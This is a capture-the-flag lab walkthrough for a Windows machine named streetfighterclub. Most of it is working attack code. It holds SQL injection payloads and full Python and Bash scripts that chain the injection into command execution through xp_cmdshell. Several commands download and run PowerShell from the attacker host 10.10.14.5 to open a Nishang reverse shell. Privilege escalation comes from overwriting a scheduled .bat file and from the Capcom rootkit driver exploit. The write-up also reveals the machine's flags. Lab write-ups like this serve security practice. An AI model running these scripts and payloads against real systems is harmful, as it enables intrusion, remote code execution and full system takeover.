Port (80)

this machine only has port 80 open, so it's all about enumerate and try to exploit some vulnerabilities on the website

I started whit the whatweb tool to gather information
``` bash
whatweb 10.10.10.72
```

Now I checked the website in the browser, there is a lot of text, but looking closely, I found information that could be useful, some hints and a doman name, so I save it in my hosts file

I'll fuzz paths, files and subdomains using wfuzz
``` bash
wfuzz -c --hc=404 -t 200 -w /wordlist http://streetfighterclub.htb/FUZZ

wfuzz -c --hc=404 --hh=6911 -t 200 -w /wordlist -H "Host: FUZZ.streetfighterclub.htb" http://streetfighterclub.htb/
```

Wfuzz found a subdomain named "members"
I use wffuuz again to fuzz the paths and files in this new URL
``` bash
wfuzz -c --hc=404  -w /wordlist http://members.streetfighterclub.htb/FUZZ/
``` 

Wfuzz discoverd a directory called "old", so i check it on the website but I  get an access denied, so I'm gonna use gobuster this time to fuzz for .asp files, I'm gonna do this because the server is an ASP.NET
``` bash
gobuster dir -u http://members.streetfighterclub.htb/old/ -w worlist -x asp,aspx
``` 

Gobuster retriev a login file, checking this in the website es a login panel
I'm going to try a sql injection using burpsuite
``` bash
logintype=2 order by 100-- -
logintype=2 order by 6-- 
logintype=2 union select 1,2,3,4,5,6-- - -> in the response I get the number that I use to inject the queryes
logintype=2 union select 1,2,3,4,@version,6-- -
```

Knowin this aplication is vulnerable to sql injeciton, I'm gonna make a script to automatized the process and try to execute commands via the sql injection with xp_cmdshell
``` python
#!/usr/bin/python3

from pwn import *
from base64 import b64decode
import requests, signal, pdb

def def_handler(sig, frame):
    print("\n\n[!] Leaving\n")
    dropTable()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global Variable
main_url = "http://members.streetfighterclub.htb/old/verify.asp"

def createTable():
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # creating rce table
    r = requests.post(main_url, data=post_data)

def truncateTable():
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;truncate table rce;-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # truncate table
    r = requests.post(main_url, data=post_data)

def executeCommand(command):
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;insert into rce(output) exec Xp_cMdShEll "%s";-- -' % command,
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # Execute command
    r = requests.post(main_url, data=post_data)
    
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # Get ID top counter
    r = requests.post(main_url, data=post_data, allow_redirects=False)
    topIdCounter = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "=")).decode()
    print(topIdCounter)

    for i in range(1, int(topIdCounter)):
        post_data = {
            'username': 'admin',
            'password': 'admin',
            'logintype': '2 union select 1,2,3,4,(select output from rce where id=%d),6-- -' % i,
            'rememberme': 'ON',
            'B1': 'LogIn'
        }
        r = requests.post(main_url, data=post_data, allow_redirects=False)
        output = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "="))

        if b"\xeb\xde\x94\xd8" not in output:
            print(output.decode())
    truncateTable()

def dropTable():
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;drop table rce;-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # Dropping table
    r = requests.post(main_url, data=post_data)

if __name__ == "__main__":
    createTable()

    while True:
        command = input("> ")
        command = command.strip('\n')

        executeCommand(command)



```
----------------
Practice bash scripting (in process)
``` bash
#!/bin/bash
#
trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n\033[0;31m[!] Exiting...\033[0m"
    dropTable
    exit 1
}
main_url="http://members.streetfighterclub.htb/old/verify.asp"

#enable advanced options
#curl -s -X POST "$main_url" \
#  --data-urlencode "logintype=2;exec sp_configure 'show advanced options', 1;-- -" \
#  --data "username=admin" \
#  --data "password=admin" \
#  --data "rememberme=ON" \
#  --data "B1=LogIn"

#sleep 2
# enable xp_cmdshell
#curl -s -X POST "$main_url" \
#  --data-urlencode "logintype=2;exec sp_configure 'Xp_cMdShEll', 1;-- -" \
#  --data "username=admin" \
#  --data "password=admin" \
#  --data "rememberme=ON" \
#  --data "B1=LogIn"


function Create_Table {
  
  curl -s -X POST "$main_url" \
  --data-urlencode "logintype=2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn" > /dev/null 
}

function Truncate_Table {
  
  curl -s -X POST "$main_url" \
  --data-urlencode "logintype=2;truncate table rce;-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn"  > /dev/null 
}

function Execute_Command {
  command="$1"
  powershell="C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell $command"
  curl -s -X POST "$main_url" \
    --data-urlencode "logintype=2;insert into rce(output) exec Xp_cMdShEll '$powershell';-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn" > /dev/null 


  topIdCounter=$(curl -i -s -X POST "$main_url" \
  --data-urlencode "logintype=2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn"  
)
  TopIdCounter_decode=$(echo "$topIdCounter" | grep -o "Email=.*;" | cut -d '=' -f 2 | cut -d ';' -f 1 | sed 's/%3D/=/g' | base64 -d; echo)
 
  for ((i = 1; i < TopIdCounter_decode; i++)); do
    output=$(curl -i -s -X POST "$main_url" \
    --data-urlencode "logintype=2 union select 1,2,3,4,(select output from rce where id=$i),6-- -" \
    --data "username=admin" \
    --data "password=admin" \
    --data "rememberme=ON" \
    --data "B1=LogIn"  
    )
  echo "$output" | grep -o "Email=.*;" | cut -d '=' -f 2 | cut -d ';' -f 1 | sed 's/%3D/=/g' | base64 -d; echo                   

  done
  
  Truncate_Table
}


function dropTable
{
  curl -s -X POST "$main_url" \
  --data-urlencode "logintype=2;drop table rce;-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn"  > /dev/null
}

Create_Table
while true; do 
  read -p "> " command
  Execute_Command "$command"

done

```
Now that I can execute commands, I need to establish a reverse shell with nishang Invoke-PowershellTCP.ps1

``` bash
# inject this command in the python script
# I have some problem with hows the server interpret the script and the only way to make this works is changing the name of the invoke powershelltcp.ps1 to PS.PS1, I don't now wy, but in this way works
❯ python3 sqlinjection.py
> C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/PS.ps1')

# On my machine
rlwrap nc -nlvp 443
```

Now finally I gain access on the victim machine, Now I need to escalate privileges

Looking around the machine directories I found a .bat file in a direcortio for another user "DEcoder". This file execute in time intervals, and we have privilege to modify it, so in this way I can gain access as the user "Decoder" modifiein the .bat file to execute my reverse shell

``` 
# On my machine create the malicius code
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/PS.PS1')

# upload this file
iwr -uri http://10.10.14.5/malicious -OutFile malicious

# delete the actual content and copy the content of my file into the .bat file
PS C:\Users\Decoder> cmd /c "copy /y NUL clean.bat"
PS C:\Users\Decoder> cmd /c "type C:\Users\sqlserv\malicious >> clean.bat"
```

Now to the excalation privilige  we need to exploit a capcom drive (https://github.com/FuzzySecurity/Capcom-Rootkit)

``` bash
git clone https://github.com/FuzzySecurity/Capcom-Rootkit
cd Capcom-Rootkit
for file in $(find . -name \*.ps1); do cat $file; echo; done > ../capcom.ps1
sudo python -m http.server 80

# On the victim machine
PS C:\> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/capcom.ps1')
PS C:\> Capcom-ElevatePID
PS C:\> whoami
nt authority\system
```

Now I'am nt authority\system, to read the root.txt (flag) I need to crack a binary,  I download it to my machine 
``` bash
PS C:\Users\Administrator\Desktop> certutil.exe -encode root.exe root.exe.b64
PS C:\Users\Administrator\Desktop> type root.exe.b64 -> copy the content

PS C:\Users\Administrator\Desktop> certutil.exe -encode checkdll.dll checkdll.dll.b64
PS C:\Users\Administrator\Desktop> type checkdll.dll.b64

# On my machine
❯ cat root | tr -d '\n' | base64 -d | sponge root.exe
❯ cat checkdll.dll | tr -d '\n' | base64 -d | sponge checkdll.dll

```

now after analizyng these binaries,  I use cyberchef application to decode the password that is in xor cipher

``` bash
PS C:\Users\Administrator\Desktop> .\root.exe OdioLaFeta
d801c1e9bd9a02f8fb30d8bd3be314c1

```

And finally I solve this machine!


root flag > d801c1e9bd9a02f8fb30d8bd3be314c1
user flag > bb6163c184f203af2a31a9c035934297